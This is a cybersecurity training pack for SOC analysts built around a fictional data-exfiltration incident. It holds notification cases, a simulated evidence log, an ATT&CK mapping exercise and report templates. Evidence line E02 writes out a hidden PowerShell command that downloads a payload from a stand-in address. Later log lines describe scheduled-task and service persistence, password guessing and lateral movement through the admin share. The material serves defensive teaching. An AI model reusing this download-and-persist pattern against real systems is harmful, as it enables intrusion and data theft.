# DAY 10 — SAMPLE DATA
## The notification cases, the SRV-BAK-02 evidence set, the ATT&CK behaviours, and the report template
### Trainer, and trainees where marked.

> **Safety note.** No live malware, no client data. EICAR is still the only "threat" that touches a real machine. Everything below is **on paper**: log lines and cases written to look like the real thing. Hostnames, people, threat names, hashes and companies are invented. Addresses use documentation-only ranges (`203.0.113.x`, `198.51.100.x`) and the Day 3 Tor node `185.220.101.1`. Every URL is **defanged** (`hxxp://`) so that it cannot be clicked.

> **Continuity. This is the running case, and it ends here.** SRV-BAK-02 appeared as **Day 7 Alert G** (ticket CTM-0007-001), got its **Day 8 verdict** (failed action, so it is a threat), and was **escalated on Day 9** (to the information security manager at 10:52 on 17 Sep). Today L2 hands the analyst the full evidence set, and the class writes the **threat report**. It also closes two older threads. **WKS-311** is the Day 3 relay alert and Day 7 Alert B (`svhost32.exe` talking to `185.220.101.1`). **SRV-FIN-02** is the Day 7 Alert D ransomware, which happened in the same minute.

---

## WHAT IS IN HERE

| Section | Used by |
|---------|---------|
| 1 · What happened after the Day 9 escalation | Topic 10.1, everyone reads first |
| 2 · The two notification cases (N1, N2) and the one you do not notify | Demo 1, Activity 1 |
| 3 · The evidence set: 18 lines, from five sources | Demos 2–4, Activities 2–4 |
| 4 · The ATT&CK behaviours to map | Topic 10.4, Demo 4, Activity 3 |
| 5 · The threat-notification template | Demo 1, Activity 1 |
| 6 · The threat report template (15 sections) | Topic 10.5, Activity 4 |
| 7 · The commands trainees run | Demo 3 (ingress / egress on your own machine) |
| 8 · The ATT&CK Navigator steps | Demo 4, Activity 3 |

---
---

# 1 — WHAT HAPPENED AFTER THE DAY 9 ESCALATION
### Read aloud at 8:15. This is the only new story for the day; everything else is evidence.

```
2026-09-17 10:52  Escalation pack sent to the information security manager (Day 9, Demo 4)
2026-09-17 11:18  Information security manager approves isolation of SRV-BAK-02
2026-09-17 11:26  IT disables the switch port — SRV-BAK-02 is isolated
2026-09-17 11:29  L2 reports: the firewall log shows 1.8 GB LEFT SRV-BAK-02 on 15 Sep, 04:10–04:52
                  to 185.220.101.1 — the same address WKS-311 was talking to on Day 3
2026-09-17 11:40  WKS-311 isolated (same file name, same address — see §3)
2026-09-17 11:45  IT resets the password of the service account svc_backup
2026-09-17 15:30  L2 hands the analyst the full evidence set (§3) and asks for the threat report
```

The line at **11:29** changes everything. On Day 9 the case was *an action that failed*. At 11:29 it becomes **data leaving the company**, which the Day 6 severity matrix puts in the Critical band. The analyst has **ten minutes** to notify the stakeholders who own the affected systems. That is Topic 10.1.

---
---

# 2 — THE TWO NOTIFICATION CASES
### Demo 1 (the trainer does N1 live), Activity 1 (pairs do N2, then decide on N3). Model wording in `Day_10_Solutions.docx`.

**"Stakeholder / client with high and critical threats are notified"** (PC 5.1) means this. When a threat is **High or Critical**, the person who owns the affected system or data is **told fast**, before the full picture is known, so they can protect what is theirs. It is **not** the Day 9 verification call, which reported a scan *result*. It is **not** the Day 9 escalation, which handed a *failure* up to an authority. A notification is a **warning to the owner**.

| | Day 9 verification | Day 9 escalation | **Day 10 notification** |
|---|---|---|---|
| **To** | The client / stakeholder | An appropriate authority | **The stakeholder / client who owns the affected system or data** |
| **About** | The scan result | A failed action | **A High or Critical threat** |
| **When** | After the scan | When an action fails | **Within 10 min (Critical) · within 1 h (High)** |
| **Purpose** | Tell the truth about the result | Get a decision or an action | **Let the owner protect what is theirs, now** |

---

**N1 — R. Santos, backup administrator, owner of SRV-BAK-02 — CRITICAL** *(Demo 1)*

*The new fact:* 1.8 GB left SRV-BAK-02 to an anonymising address on 15 Sep, 04:10–04:52. The files that were read just before are the **finance backups** (`D:\Backups\FIN_2026-09-14.bak`, §3 line E15).

*What R. Santos needs to hear:*
1. The ticket ID
2. Severity **Critical**, and why: data left the server
3. What is known: roughly 1.8 GB, 15 Sep 04:10–04:52, to an outside anonymising address, and finance backup files were read just before
4. What has been done: the server was isolated at 11:26 and the svc_backup password was reset at 11:45
5. What they must **do / not do**: **do not reconnect SRV-BAK-02**, **do not use svc_backup anywhere**, and **do not restore from any backup taken after 14 Sep 16:51** until it is cleared
6. The **one ask**: confirm which backup sets were stored on D:\Backups on 15 Sep, so we know what may have left
7. The next update time
8. A read-back, then the same in writing

---

**N2 — J. Mendoza, Operations supervisor, manager of m.delacruz (the user of WKS-311) — HIGH** *(Activity 1)*

*The facts:* WKS-311 is where it started. A macro document opened on 14 Sep at 16:51 downloaded `svhost32.exe`. It has talked to the anonymising address every five minutes since. The machine was isolated at 11:40. Nothing shows data leaving *WKS-311 itself*. The attacker used WKS-311 as the **stepping stone** to SRV-BAK-02.

*Why High and not Critical?* WKS-311 had confirmed malware running with network activity and is now isolated (High on the Day 6 matrix). The Critical part of the incident, **the data leaving**, happened on SRV-BAK-02 and is carried by N1. *(A trainee who calls N2 Critical, with the reason "it is the origin of an incident that is Critical", is also acceptable. See Solutions.)*

*What J. Mendoza needs:* the ticket ID, High, that m.delacruz's computer is infected and isolated, **not their fault to discuss on the phone**, that m.delacruz will need a loan machine, and that **the invoice email from 14 Sep must not be opened by anyone else in the team**. The **one ask**: tell the team today not to open `Invoice_Sept.docm`, and tell the desk if anyone already has. Then give the next update time, get a read-back, and follow up in writing.

---

**N3 — SRV-FILE-01's owner — DO NOT NOTIFY (record only)**

*The facts:* 12 failed logons from WKS-311 to SRV-FILE-01 at 03:34–03:35 (§3 line E09). **No** successful logon followed, **no** file was written, and **no** `svhost32.exe` was found there. This is an **attempted** spread that **failed**. On the Day 6 matrix that is **Medium** (one blocked intrusion attempt).

*The rule:* PC 5.1 says **High and Critical** are notified. Medium is **recorded in the report**, not phoned through. Notifying everyone about everything teaches people to ignore you. *(Trainees who still send a short courtesy note are not wrong, as long as they do not call it a notification of a High threat.)*

---
---

# 3 — THE EVIDENCE SET
### What L2 handed over at 15:30 on 17 Sep. Eighteen lines from five sources, in time order. Demos 2–4 read them; Activities 2–4 use them. **Trainees get this whole section.**

**Where each line comes from**

| Source | What it is | Seen before |
|--------|------------|-------------|
| **Email gateway log** | Every email in and out, with attachments | Day 7 Alert E |
| **Security log** (event IDs 4624, 4625, 4688, 4698, 5145, 4663) | Logons, new processes, new scheduled tasks, share access, file access | Day 5 (Event Viewer) |
| **System log** (event ID 7045) | A new **service** was installed | new today |
| **Defender Operational log** (1116, 1118) | Detections and actions | Days 6–9 |
| **Perimeter firewall / proxy log** | Every connection in or out of the building, with **bytes in / bytes out** | Day 6 |

> **Two new event IDs today.** **7045** in the System log means *"a service was installed on this machine"*. **4698** in the Security log means *"a scheduled task was created"*. Both are how malware **installs itself to stay**.

**The lab addresses:** WKS-311 = `192.168.10.31` · SRV-BAK-02 = `192.168.10.21` · SRV-FILE-01 = `192.168.10.22` · SRV-FIN-02 = `192.168.10.20`.

```
── Monday 14 Sep ───────────────────────────────────────────────────────────────────────────────────

E01  16:47:12  Email gateway   DELIVERED  to: m.delacruz   from: billing@payables-ph.example
                               subject: "Invoice September – overdue"   attachment: Invoice_Sept.docm
                               verdict: no signature match — delivered

E02  16:51:36  WKS-311  Security 4688  New process: powershell.exe   Parent: WINWORD.EXE
                               User: m.delacruz
                               Command line: powershell -w hidden -c "iwr hxxp://203.0.113.45/p.txt
                                             -OutFile C:\Users\Public\svhost32.exe"

E03  16:51:37  Firewall/proxy  ALLOW  OUT  192.168.10.31:51022 -> 203.0.113.45:80
                               GET /p.txt   bytes_in=1,245,184   bytes_out=412

E04  16:52:10  WKS-311  Security 4688  New process: C:\Users\Public\svhost32.exe   Parent: powershell.exe

E05  16:52:14  WKS-311  Security 4698  Scheduled task created: \OneDriveSyncHelper
                               Action: C:\Users\Public\svhost32.exe   Trigger: at logon of any user

── Tuesday 15 Sep ──────────────────────────────────────────────────────────────────────────────────

E06  02:14:05  Firewall/proxy  ALLOW  OUT  192.168.10.31 -> 185.220.101.1:443
     to 03:40  (17 connections, one every ~5 minutes, bytes_out 1.8–2.2 KB each, bytes_in 0.9–1.1 KB)

E07  03:02:11  SRV-BAK-02  Security 4625 × 38   Failed logon   Account: svc_backup
     to 03:31  Logon type 3 (network)   Source: 192.168.10.31   Reason: unknown user name or bad password

E08  03:33:02  SRV-BAK-02  Security 4624   Successful logon   Account: svc_backup
                               Logon type 3 (network)   Source: 192.168.10.31

E09  03:34:10  SRV-FILE-01  Security 4625 × 12   Failed logon   Accounts: svc_backup, administrator
     to 03:35  Logon type 3   Source: 192.168.10.31      (no 4624 follows)

E10  03:38:21  SRV-BAK-02  Security 5145   Network share accessed: \\*\ADMIN$
                               Relative target: Temp\svhost32.exe   Access: WriteData
                               Account: svc_backup   Source: 192.168.10.31

E11  03:39:02  SRV-BAK-02  System 7045   A service was installed
                               Service name: WinHostSvc   Image: C:\Windows\Temp\svhost32.exe
                               Start type: auto start   Account: LocalSystem
                               (Service recovery setting: restart the service after every failure)

E12  03:40:11  SRV-BAK-02  Defender 1116   Trojan.Agent.XZ   file:_C:\Windows\Temp\svhost32.exe
     03:40:12  SRV-BAK-02  Defender 1118   Action: Quarantine  FAILED  — the file is in use by another process

E13  03:41:30  Firewall/proxy  ALLOW  OUT  192.168.10.21 -> 185.220.101.1:443
     onward    (every ~5 minutes until the port was disabled on 17 Sep 11:26)

E14  04:10:02  Firewall/proxy  ALLOW  OUT  192.168.10.21:50311 -> 185.220.101.1:443
     to 04:52  one session   bytes_out=1,874,329,600 (≈ 1.8 GB)   bytes_in=48,212

E15  04:05:40  SRV-BAK-02  Security 4663   File read: D:\Backups\FIN_2026-09-14.bak
                               Process: C:\Windows\Temp\svhost32.exe   Account: SYSTEM

── Collected by L2 on 17 Sep ───────────────────────────────────────────────────────────────────────

E16  SHA-256 of C:\Users\Public\svhost32.exe    (WKS-311)     9614A003504A2C4BBA8ED8752D5B6898...ED161329
     SHA-256 of C:\Windows\Temp\svhost32.exe     (SRV-BAK-02)  9614A003504A2C4BBA8ED8752D5B6898...ED161329
                                                                 → the SAME file on both machines

E17  SRV-FIN-02 (the Day 7 ransomware, same night)
     03:22:40  Security 4624   Logon type 10 (remote desktop)   Account: fin_admin   Source: 198.51.100.61 (VPN)
     03:40:05  first file renamed to .locked, by process C:\ProgramData\lck.exe
     No logon from 192.168.10.31 · no svhost32.exe · no connection to 185.220.101.1

E18  Firewall/proxy, 14–17 Sep: NO inbound connection from the internet to 192.168.10.31 or 192.168.10.21.
     Every connection between those two hosts and the internet was started from the inside.
```

> **The full hash** (for the report's attachment list, and to show that the shortened form above is the same): `9614A003504A2C4BBA8ED8752D5B68985DE7E77B7DD4B91299F58A54ED161329`.

**What each part of the report draws on** *(trainer's map, not given to trainees)*

| Report part | PC | Lines |
|-------------|----|-------|
| Spread: which hosts, and how involved | 5.2 | E06, E08, E09, E12, E16, E17 |
| Lateral movement: the path | 5.2 | E07, E08, E10, E11 |
| Ingress: what came in | 5.3 | E01, E03, E10 (internal), E18 |
| Egress: what went out | 5.3 | E06, E13, E14 |
| Exploitation activity | 5.4 | E01–E02 (user ran a macro), E07–E08 (password guessing, then success) |
| Installation behaviour | 5.4 | E05 (scheduled task), E11 (service with auto-restart), E10 (tool copied in) |
| Not linked | 5.2 | E17, SRV-FIN-02 |

---
---

# 4 — THE ATT&CK BEHAVIOURS TO MAP
### Topic 10.4, Demo 4 (the trainer maps B1–B3 live in Navigator), Activity 3 (teams map B4–B12; every trainee builds and exports a layer). Answers in `Day_10_Solutions.docx`.

Twelve behaviours from the evidence set, each in plain words. The trainee finds the **tactic** (the attacker's goal: *why*) and the **technique** (the method: *how*), with its ID. They check the ID on `attack.mitre.org`, as on Day 3.

| # | The behaviour, in plain words | Evidence line |
|---|-------------------------------|---------------|
| B1 | An email with a macro document was sent to a user | E01 |
| B2 | The user opened the document and the macro ran | E02 |
| B3 | PowerShell was used to run a hidden command | E02 |
| B4 | A program was pulled in from an outside web address | E03 |
| B5 | The program was given a name that looks like a real Windows file | E04, E12 |
| B6 | A scheduled task was made to start the program at every logon | E05 |
| B7 | Many passwords were tried against one account until one worked | E07–E08 |
| B8 | The attacker then logged on with that real account | E08 |
| B9 | The program was copied to a server through the admin share | E10 |
| B10 | A Windows service was created to run the program and restart it | E11 |
| B11 | The program talked to an outside address every five minutes over HTTPS, through an anonymising network | E06, E13 |
| B12 | 1.8 GB was sent out over that same connection | E14 |

*(Twelve rows. Demo 4 maps B1–B3. Activity 3 maps B4–B12, and a team that is short of time does B6, B7, B9, B10 and B12, which carry the two PCs of Topic 10.4.)*

---
---

# 5 — THE THREAT-NOTIFICATION TEMPLATE
### PC 5.1. By voice first (the ten minutes), then in writing within the hour. Pasted into the ticket.

**The call: seven lines, under two minutes**
1. Who you are, the desk, and the **ticket ID**
2. "This is a **Critical** / **High** security notification about **<system>**."
3. **What is known**, in one or two plain sentences, and **since when**
4. **What has been done** already
5. **What you must do / must not do**, now
6. **The one thing we need from you**
7. **Next update** by <time>. Then the **read-back**, and "in writing within the hour".

**The written notification**
```
To:        <stakeholder / client>
Subject:   [CRITICAL] / [HIGH] Security notification — <ticket ID> — <system>
Date/time: <date, time sent>          Notified by phone at: <time>

1. Severity:            CRITICAL / HIGH — because <one reason from the matrix>
2. What is known:       <what, where, since when — plain words>
3. What has been done:  <isolated / password reset / escalated to …>
4. What you must do:    <do / do not — specific>
5. What we need:        <one specific ask, with a time>
6. Next update:         <time>

This notification is based on what is known at <time>. It will be updated.

<Your name>, L1 analyst, <desk>   ·   Ticket <ID>
```

> **Three rules.** (1) **Fast beats complete.** Send what is known now, and say that it will be updated. (2) **Tell them what to do.** A notification with no "do / do not" is only news. (3) **Only High and Critical.** Medium and Low go in the report.

---
---

# 6 — THE THREAT REPORT TEMPLATE
### Topic 10.5, Activity 4. Fifteen sections. Sections 3–10 carry the four PCs; the others make the report usable.

| # | Section | What goes in it | PC |
|---|---------|-----------------|----|
| 1 | **Header** | Report ID · ticket(s) · author · date · status (draft / final) · "Internal — restricted" | — |
| 2 | **Summary** | Four sentences a manager can read in 30 seconds: what, where, since when, what now | — |
| 3 | **Severity and notification record** | Severity with the reason · who was notified, when, by what channel, read-back yes / no | **5.1** |
| 4 | **Hosts and spread** | Every host: role · how involved (*origin · confirmed · attempted · not linked*) · evidence line | **5.2** |
| 5 | **Lateral movement** | From → to · method · account · time · evidence line | **5.2** |
| 6 | **Ingress** | What came **in**: from where, when, how much · evidence line | **5.3** |
| 7 | **Egress** | What went **out**: to where, when, how much · evidence line | **5.3** |
| 8 | **Exploitation activity** | How they got in, and how they got more access · evidence line | **5.4** |
| 9 | **Installation behaviour** | What they left behind to stay, and to restart · evidence line | **5.4** |
| 10 | **ATT&CK mapping** | Tactic · technique ID · name · evidence line · Navigator layer attached | **5.4** |
| 11 | **Timeline** | 8–12 key events, in time order, with the time zone | — |
| 12 | **Containment status** | Each host: contained? · by what · when | — |
| 13 | **What we do not know yet** | Honest gaps, e.g. "how the macro got past the gateway" | — |
| 14 | **Recommendations and asks** | Verb · object · owner · by when | — |
| 15 | **Attachments** | Evidence extract · hashes · Navigator JSON · the Day 7–9 ticket, worksheet and pack | — |

> **The report rule:** every claim points to an evidence line. A claim without a line is an opinion (Day 9).

---
---

# 7 — THE COMMANDS TRAINEES RUN
### Demo 3 (ingress and egress on your OWN machine). They only **read** what your machine is already doing. They send nothing, and they scan nothing.

```powershell
# 1. EGRESS — connections your machine STARTED, going out (Established, remote port 443 / 80)
Get-NetTCPConnection -State Established |
  Select-Object LocalAddress, LocalPort, RemoteAddress, RemotePort, OwningProcess |
  Sort-Object RemotePort | Format-Table -AutoSize

# 2. Which program owns one of them? (put a real OwningProcess number in place of 1234)
Get-Process -Id 1234 | Select-Object Id, ProcessName, Path

# 3. INGRESS — ports your machine is LISTENING on, waiting for someone to come in
Get-NetTCPConnection -State Listen |
  Select-Object LocalAddress, LocalPort, OwningProcess |
  Sort-Object LocalPort | Format-Table -AutoSize

# 4. How much has gone in and out through the network card since it started?
Get-NetAdapterStatistics | Select-Object Name, ReceivedBytes, SentBytes
```

**How to read it**

| You see | It is | Why |
|---------|-------|-----|
| **Your** port is high (49152–65535), the **remote** port is 443 or 80 | **Egress**: your machine started it, going out | High local port = a client. The remote side is the service |
| State **Listen** on a port such as 135, 445, 5040 | **Possible ingress**: a door that is open, waiting | Listening = waiting for someone to connect **in** |
| `LocalAddress` **127.0.0.1** | Only this machine can reach it | Loopback never leaves the computer |
| `LocalAddress` **0.0.0.0** or your own IP | Other machines could try to reach it | That is why the firewall matters |

> **The rule from Days 5–6 stays:** only your own machine, only your own traffic. You are reading, not scanning. Do not post other people's addresses in the chat.

*Preview only (not run today):* **TCPView** (Sysinternals, portable) shows the same connections live and colours new ones green and closing ones red. **Wazuh** will show every machine's connections. They arrive with the on-site lab and the server.

---
---

# 8 — THE ATT&CK NAVIGATOR STEPS
### Demo 4, Activity 3. Runs in the browser. Nothing to install, no account, no server.

**Address:** `https://mitre-attack.github.io/attack-navigator/`

1. Click **Create New Layer**, then **Enterprise**. The big matrix appears: tactics are the columns, techniques are the boxes.
2. Rename the layer: click the layer name box at the top and type `CTM-0007-001 SRV-BAK-02`.
3. Click the **magnifier** (search) in the toolbar. Type the technique ID, for example `T1110.001`, and wait for the results.
4. In the results, hover over the technique and click **select**. The box is outlined in the matrix.
5. With it selected, click the **paint bucket** (background colour) and pick a colour. Use one colour for the whole incident.
6. Click the **speech bubble** (comment) and type the evidence line, for example `E07-E08 38 failed logons then success, svc_backup`.
7. Click an empty part of the page to deselect. Repeat 3–6 for every technique.
8. **Sub-techniques** (the ones with a dot, like `.001`) sit inside their parent box. If you cannot see one, use the toolbar button that **expands sub-techniques**, or search again.
9. Save the layer: click the **download** (layer as JSON) button in the toolbar. Save it as `Evidence/Day_10/CTM-0007-001_attack_layer.json`.
10. Optional: the **camera** button exports the matrix as a picture for the report.

> **If the page looks different.** The Navigator is updated from time to time and the icons move. The five things you need always exist: *create layer · search · colour · comment · download JSON*. Hover over the toolbar icons to read their names.
>
> **If the site will not load:** use the paper mapping table in the Activity Pack (Part 3). The JSON can be made later. The **mapping** is the skill.
